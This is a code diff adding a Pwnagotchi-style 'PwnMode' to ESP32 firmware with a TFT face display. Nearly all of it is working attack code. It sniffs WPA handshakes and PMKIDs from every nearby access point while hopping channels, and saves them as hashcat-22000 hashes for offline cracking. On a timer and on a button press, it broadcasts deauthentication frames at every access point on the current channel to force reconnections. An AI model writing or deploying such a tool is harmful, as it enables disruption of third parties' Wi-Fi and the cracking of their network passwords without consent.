@@ -6710,3 +6710,481 @@ void run() {
 
 }  // namespace OtaGithub
 
+/* ════════════════════════════════════════════════════════════════════════════
+   PwnMode — Pwnagotchi-style autonomous handshake hunter.
+
+   Same EAPOL / PMKID parsing as HandshakeCapture, but:
+     - Walks channels 1..13 on a 5 s dwell.
+     - Captures from EVERY BSSID it sees, not a single target.
+     - Builds a BSSID -> SSID/channel table from beacons it sniffs along
+       the way, so the hashcat-22000 records have the right ESSID.
+     - Periodically fires a broadcast deauth at every BSSID on the current
+       channel to provoke fresh M1/M2 sequences.
+     - Shows an animated little face on the TFT whose mood depends on time
+       since the last successful capture (idle / watching / happy / sad /
+       angry-when-deauthing).
+   RIGHT button: manual deauth burst now.   SELECT: exit.
+   ════════════════════════════════════════════════════════════════════════════ */
+namespace PwnMode {
+
+static constexpr int PWN_MAX_BSSIDS         = 48;
+static constexpr int PWN_INFLIGHT           = 8;
+static constexpr int PWN_CHANNEL_DWELL_MS   = 5000;
+static constexpr int PWN_DEAUTH_INTERVAL_MS = 45000;
+static constexpr int PWN_FACE_HAPPY_MS      = 6000;     // bright after capture
+static constexpr int PWN_FACE_SAD_MS        = 120000;   // goes sad after 2 min dry
+
+struct BssidEntry {
+  uint8_t bssid[6];
+  char    ssid[33];
+  uint8_t channel;
+};
+struct InFlight {
+  uint8_t bssid[6];
+  uint8_t client[6];
+  uint8_t anonce[32];
+  uint8_t m2_eapol[256];
+  int     m2_eapol_len;
+  bool    has_m1;
+  bool    has_m2;
+};
+enum class Face { IDLE, WATCH, HAPPY, SAD, ANGRY };
+
+static BssidEntry bssidTbl[PWN_MAX_BSSIDS];
+static int        bssidCount = 0;
+static InFlight   inflight[PWN_INFLIGHT];
+static int        inflightNext = 0;
+
+static volatile uint32_t pmkidCount     = 0;
+static volatile uint32_t handshakeCount = 0;
+static volatile uint32_t framesSeen     = 0;
+static volatile uint32_t eapolSeen      = 0;
+static volatile uint32_t beaconsSeen    = 0;
+static uint8_t  currentChannel   = 1;
+static uint32_t channelStartMs   = 0;
+static uint32_t startMs          = 0;
+static uint32_t lastCaptureMs    = 0;
+static uint32_t lastDeauthMs     = 0;
+static uint32_t lastFaceMs       = 0;
+static uint32_t lastHudMs        = 0;
+static Face     currentFace      = Face::IDLE;
+static Face     lastDrawnFace    = (Face)(-1);
+static bool     sdReady          = false;
+static bool     autoDeauth       = true;
+
+// ── Face glyph strings (centered, monospace) ─────────────────────────────────
+static const char* faceStr(Face f) {
+  switch (f) {
+    case Face::IDLE:  return "( -_- )";
+    case Face::WATCH: return "( o_o )";
+    case Face::HAPPY: return "( ^_^ )";
+    case Face::SAD:   return "( T_T )";
+    case Face::ANGRY: return "(>_<#)";
+  }
+  return "( ?_? )";
+}
+
+// ── BSSID table helpers ───────────────────────────────────────────────────────
+static BssidEntry* upsertBssid(const uint8_t* bssid, const char* ssid, uint8_t ch) {
+  for (int i = 0; i < bssidCount; i++) {
+    if (memcmp(bssidTbl[i].bssid, bssid, 6) == 0) {
+      if (ssid && ssid[0] && bssidTbl[i].ssid[0] == 0) {
+        strncpy(bssidTbl[i].ssid, ssid, 32);
+        bssidTbl[i].ssid[32] = 0;
+      }
+      if (ch) bssidTbl[i].channel = ch;
+      return &bssidTbl[i];
+    }
+  }
+  if (bssidCount >= PWN_MAX_BSSIDS) return nullptr;
+  BssidEntry* e = &bssidTbl[bssidCount++];
+  memcpy(e->bssid, bssid, 6);
+  if (ssid) { strncpy(e->ssid, ssid, 32); e->ssid[32] = 0; }
+  else      { e->ssid[0] = 0; }
+  e->channel = ch;
+  return e;
+}
+
+// ── In-flight handshake slot mgmt ─────────────────────────────────────────────
+static InFlight* findInflight(const uint8_t* bssid, const uint8_t* client) {
+  for (int i = 0; i < PWN_INFLIGHT; i++) {
+    if ((inflight[i].has_m1 || inflight[i].has_m2)
+        && memcmp(inflight[i].bssid, bssid, 6) == 0
+        && memcmp(inflight[i].client, client, 6) == 0) {
+      return &inflight[i];
+    }
+  }
+  return nullptr;
+}
+static InFlight* allocInflight(const uint8_t* bssid, const uint8_t* client) {
+  InFlight* s = findInflight(bssid, client);
+  if (s) {
+    memset(s, 0, sizeof(*s));
+    memcpy(s->bssid, bssid, 6);
+    memcpy(s->client, client, 6);
+    return s;
+  }
+  s = &inflight[inflightNext];
+  inflightNext = (inflightNext + 1) % PWN_INFLIGHT;
+  memset(s, 0, sizeof(*s));
+  memcpy(s->bssid, bssid, 6);
+  memcpy(s->client, client, 6);
+  return s;
+}
+
+// ── hashcat-22000 writers ────────────────────────────────────────────────────
+static void writeHex(File& f, const uint8_t* data, int n) {
+  for (int i = 0; i < n; i++) {
+    char b[3]; snprintf(b, sizeof(b), "%02x", data[i]); f.print(b);
+  }
+}
+static void writeAsciiHex(File& f, const char* s) {
+  for (int i = 0; s[i]; i++) {
+    char b[3]; snprintf(b, sizeof(b), "%02x", (uint8_t)s[i]); f.print(b);
+  }
+}
+static void ensureCapturesDir() {
+  if (!SD.exists("/captures")) SD.mkdir("/captures");
+}
+
+static void writePmkid(const BssidEntry& ap, const uint8_t* sta, const uint8_t pmkid[16]) {
+  ensureCapturesDir();
+  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
+  if (!f) return;
+  f.print("WPA*01*"); writeHex(f, pmkid, 16);
+  f.print("*");       writeHex(f, ap.bssid, 6);
+  f.print("*");       writeHex(f, sta, 6);
+  f.print("*");       writeAsciiHex(f, ap.ssid);
+  f.println("***");
+  f.close();
+  pmkidCount++;
+  lastCaptureMs = millis();
+}
+static void writeHandshake(const BssidEntry& ap, const InFlight& s) {
+  if (!s.has_m1 || !s.has_m2 || s.m2_eapol_len < 99) return;
+  uint8_t m2[256]; memcpy(m2, s.m2_eapol, s.m2_eapol_len);
+  uint8_t mic[16]; memcpy(mic, &m2[81], 16); memset(&m2[81], 0, 16);
+  ensureCapturesDir();
+  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
+  if (!f) return;
+  f.print("WPA*02*"); writeHex(f, mic, 16);
+  f.print("*");       writeHex(f, ap.bssid, 6);
+  f.print("*");       writeHex(f, s.client, 6);
+  f.print("*");       writeAsciiHex(f, ap.ssid);
+  f.print("*");       writeHex(f, s.anonce, 32);
+  f.print("*");       writeHex(f, m2, s.m2_eapol_len);
+  f.println("*00");
+  f.close();
+  handshakeCount++;
+  lastCaptureMs = millis();
+}
+
+// ── RSN/WPA Key Data: extract PMKID-KDE (OUI 00-0F-AC type 4) ────────────────
+static bool extractPmkid(const uint8_t* kd, int kdLen, uint8_t out[16]) {
+  int i = 0;
+  while (i + 2 <= kdLen) {
+    uint8_t tag = kd[i], len = kd[i + 1];
+    if (i + 2 + len > kdLen) return false;
+    if (tag == 0xDD && len >= 4 + 16
+        && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F
+        && kd[i + 4] == 0xAC && kd[i + 5] == 0x04) {
+      memcpy(out, &kd[i + 6], 16);
+      return true;
+    }
+    i += 2 + len;
+  }
+  return false;
+}
+
+// ── Parse beacon tagged params: SSID (tag 0) + DS channel (tag 3) ────────────
+static void parseBeacon(const uint8_t* p, int len, char* outSsid, uint8_t* outCh) {
+  outSsid[0] = 0;
+  *outCh = 0;
+  if (len < 36) return;             // 24 hdr + 12 fixed beacon body
+  int i = 36;
+  while (i + 2 <= len) {
+    uint8_t tag = p[i], tlen = p[i + 1];
+    if (i + 2 + tlen > len) return;
+    if (tag == 0x00 && tlen <= 32) {
+      memcpy(outSsid, &p[i + 2], tlen);
+      outSsid[tlen] = 0;
+    } else if (tag == 0x03 && tlen == 1) {
+      *outCh = p[i + 2];
+    }
+    i += 2 + tlen;
+  }
+}
+
+// ── Promiscuous RX ───────────────────────────────────────────────────────────
+static void rxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* p = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  if (len < 24) return;
+  framesSeen++;
+
+  uint8_t fc0 = p[0], fc1 = p[1];
+  uint8_t frame_type = (fc0 >> 2) & 0x3;
+  uint8_t subtype    = (fc0 >> 4) & 0xF;
+
+  // Beacon: type=0, subtype=8 (frame ctrl byte 0x80 in upper bits)
+  if (type == WIFI_PKT_MGMT && frame_type == 0 && subtype == 8) {
+    beaconsSeen++;
+    const uint8_t* bssid = p + 16;
+    char ssid[33]; uint8_t ch = 0;
+    parseBeacon(p, len, ssid, &ch);
+    upsertBssid(bssid, ssid[0] ? ssid : nullptr, ch ? ch : currentChannel);
+    return;
+  }
+
+  // EAPOL lives in data frames only.
+  if (frame_type != 2) return;
+  bool isQoS = (subtype & 0x08) != 0;
+  int hdrLen = isQoS ? 26 : 24;
+  if (len < hdrLen + 8) return;
+
+  bool toDS   = (fc1 & 0x01) != 0;
+  bool fromDS = (fc1 & 0x02) != 0;
+  const uint8_t *dst = nullptr, *src = nullptr, *bssid = nullptr;
+  if      (!toDS && !fromDS) { dst = p + 4;  src = p + 10; bssid = p + 16; }
+  else if (!toDS &&  fromDS) { dst = p + 4;  bssid = p + 10; src = p + 16; }
+  else if ( toDS && !fromDS) { bssid = p + 4; src = p + 10; dst = p + 16; }
+  else return;
+
+  const uint8_t* snap = p + hdrLen;
+  if (snap[0] != 0xAA || snap[1] != 0xAA || snap[2] != 0x03) return;
+  if (snap[6] != 0x88 || snap[7] != 0x8E) return;
+
+  const uint8_t* eapol = snap + 8;
+  int eapolLen = len - hdrLen - 8;
+  if (eapolLen < 99) return;
+  if (eapol[1] != 0x03) return;
+  if (eapol[4] != 0x02 && eapol[4] != 0xFE) return;
+  eapolSeen++;
+
+  uint16_t keyInfo = ((uint16_t)eapol[5] << 8) | eapol[6];
+  bool kiKeyType = (keyInfo & 0x0008) != 0;
+  bool kiInstall = (keyInfo & 0x0040) != 0;
+  bool kiKeyAck  = (keyInfo & 0x0080) != 0;
+  bool kiMic     = (keyInfo & 0x0100) != 0;
+  if (!kiKeyType) return;
+
+  bool isM1 = kiKeyAck && !kiMic && !kiInstall;
+  bool isM2 = !kiKeyAck && kiMic && !kiInstall;
+  const uint8_t* nonce = &eapol[17];
+  uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];
+
+  BssidEntry* ap = upsertBssid(bssid, nullptr, currentChannel);
+  if (!ap) return;
+
+  if (isM1) {
+    const uint8_t* client = dst;
+    InFlight* s = allocInflight(bssid, client);
+    memcpy(s->anonce, nonce, 32);
+    s->has_m1 = true;
+    if (kdLen > 0 && (int)kdLen <= eapolLen - 99) {
+      uint8_t pmkid[16];
+      if (extractPmkid(&eapol[99], kdLen, pmkid) && sdReady) {
+        writePmkid(*ap, client, pmkid);
+      }
+    }
+  } else if (isM2) {
+    const uint8_t* client = src;
+    InFlight* s = findInflight(bssid, client);
+    if (!s) return;
+    if (eapolLen > (int)sizeof(s->m2_eapol)) return;
+    memcpy(s->m2_eapol, eapol, eapolLen);
+    s->m2_eapol_len = eapolLen;
+    s->has_m2 = true;
+    if (sdReady) writeHandshake(*ap, *s);
+    memset(s, 0, sizeof(*s));
+  }
+}
+
+// ── Deauth burst across every AP on the current channel ──────────────────────
+static void deauthOnCurrentChannel() {
+  uint8_t f[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00, 0x07, 0x00
+  };
+  for (int i = 0; i < bssidCount; i++) {
+    if (bssidTbl[i].channel != currentChannel) continue;
+    memcpy(&f[10], bssidTbl[i].bssid, 6);
+    memcpy(&f[16], bssidTbl[i].bssid, 6);
+    for (int j = 0; j < 6; j++) {
+      Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
+      delayMicroseconds(1500);
+    }
+  }
+  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+}
+
+// ── UI ───────────────────────────────────────────────────────────────────────
+static const uint16_t ARA_RED  = 0xE0E6;
+static const uint16_t ARA_MID  = 0x9085;
+static const uint16_t ARA_DIM  = 0x6020;
+static const uint16_t ARA_GRN  = 0x07C0;
+
+static void drawShell() {
+  tft.fillScreen(TFT_BLACK);
+  tft.drawFastHLine(0, 0, 240, ARA_RED);
+  tft.drawFastHLine(0, 24, 240, ARA_DIM);
+  tft.drawFastHLine(0, 296, 240, ARA_DIM);
+  tft.drawFastHLine(0, 319, 240, ARA_RED);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(ARA_RED, TFT_BLACK);
+  tft.setCursor(72, 6);
+  tft.print("[ PWN MODE ]");
+  tft.setTextColor(ARA_DIM, TFT_BLACK);
+  tft.setCursor(8, 301);
+  tft.print("RIGHT=DEAUTH  SEL=BACK");
+}
+
+static void drawFace() {
+  tft.fillRect(0, 30, 240, 56, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextSize(3);
+  tft.setTextColor(ARA_RED, TFT_BLACK);
+  const char* face = faceStr(currentFace);
+  int fw = tft.textWidth(face);
+  tft.setCursor((240 - fw) / 2, 34);
+  tft.print(face);
+  lastDrawnFace = currentFace;
+}
+
+static void drawHud() {
+  tft.fillRect(0, 92, 240, 200, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  char buf[64];
+
+  tft.setTextColor(ARA_RED, TFT_BLACK);
+  tft.setCursor(10, 100);
+  snprintf(buf, sizeof(buf), "PMKIDs:       %lu", (unsigned long)pmkidCount);   tft.print(buf);
+  tft.setCursor(10, 118);
+  snprintf(buf, sizeof(buf), "Handshakes:   %lu", (unsigned long)handshakeCount); tft.print(buf);
+
+  tft.setTextColor(ARA_MID, TFT_BLACK);
+  tft.setCursor(10, 142);
+  snprintf(buf, sizeof(buf), "APs seen:     %d", bssidCount);                   tft.print(buf);
+  tft.setCursor(10, 160);
+  snprintf(buf, sizeof(buf), "Beacons:      %lu", (unsigned long)beaconsSeen);  tft.print(buf);
+  tft.setCursor(10, 178);
+  snprintf(buf, sizeof(buf), "EAPOL frames: %lu", (unsigned long)eapolSeen);    tft.print(buf);
+
+  tft.setTextColor(ARA_RED, TFT_BLACK);
+  tft.setCursor(10, 206);
+  snprintf(buf, sizeof(buf), "Channel:      %u", currentChannel);               tft.print(buf);
+
+  uint32_t up = (millis() - startMs) / 1000;
+  tft.setCursor(10, 224);
+  snprintf(buf, sizeof(buf), "Uptime:       %02lu:%02lu:%02lu",
+           (unsigned long)(up / 3600),
+           (unsigned long)((up / 60) % 60),
+           (unsigned long)(up % 60));
+  tft.print(buf);
+
+  tft.setTextColor(sdReady ? ARA_GRN : ARA_RED, TFT_BLACK);
+  tft.setCursor(10, 252);
+  tft.print(sdReady ? "SD: writing /captures/handshakes.22000"
+                    : "SD: NOT READY (no card?)");
+}
+
+// ── Setup / loop / exit ──────────────────────────────────────────────────────
+void pwnSetup() {
+  pmkidCount = 0;
+  handshakeCount = 0;
+  framesSeen = 0;
+  eapolSeen = 0;
+  beaconsSeen = 0;
+  bssidCount = 0;
+  memset(inflight, 0, sizeof(inflight));
+  inflightNext = 0;
+  currentChannel = 1;
+  uint32_t now = millis();
+  channelStartMs = now;
+  startMs = now;
+  lastCaptureMs = now;
+  lastDeauthMs = now;
+  lastFaceMs = 0;
+  lastHudMs = 0;
+  currentFace = Face::IDLE;
+  lastDrawnFace = (Face)(-1);
+  autoDeauth = true;
+
+  sdReady = (SD.cardSize() > 0);
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, true);
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(&rxCallback);
+  esp_wifi_set_promiscuous(true);
+
+  drawShell();
+  drawFace();
+  drawHud();
+}
+
+void pwnLoop() {
+  uint32_t now = millis();
+
+  // Channel hop.
+  if (now - channelStartMs >= PWN_CHANNEL_DWELL_MS) {
+    currentChannel++;
+    if (currentChannel > 13) currentChannel = 1;
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    channelStartMs = now;
+  }
+
+  // Auto-deauth.
+  if (autoDeauth && bssidCount > 0 && (now - lastDeauthMs) >= PWN_DEAUTH_INTERVAL_MS) {
+    lastDeauthMs = now;
+    currentFace = Face::ANGRY;
+    drawFace();
+    deauthOnCurrentChannel();
+  }
+
+  // Mood update.
+  if (now - lastFaceMs > 800) {
+    lastFaceMs = now;
+    Face nf;
+    if (now - lastCaptureMs < PWN_FACE_HAPPY_MS)     nf = Face::HAPPY;
+    else if (now - lastCaptureMs > PWN_FACE_SAD_MS)  nf = Face::SAD;
+    else                                              nf = Face::WATCH;
+    if (currentFace != Face::ANGRY) currentFace = nf;
+    if (currentFace != lastDrawnFace) drawFace();
+  }
+
+  // HUD refresh.
+  if (now - lastHudMs > 500) {
+    lastHudMs = now;
+    drawHud();
+  }
+
+  // Manual deauth on RIGHT.
+  if (!pcf.digitalRead(BTN_RIGHT)) {
+    currentFace = Face::ANGRY;
+    drawFace();
+    deauthOnCurrentChannel();
+    lastDeauthMs = now;
+    delay(300);
+  }
+
+  if (isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+  }
+}
+
+void pwnExit() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+}
+
+}  // namespace PwnMode
+
+
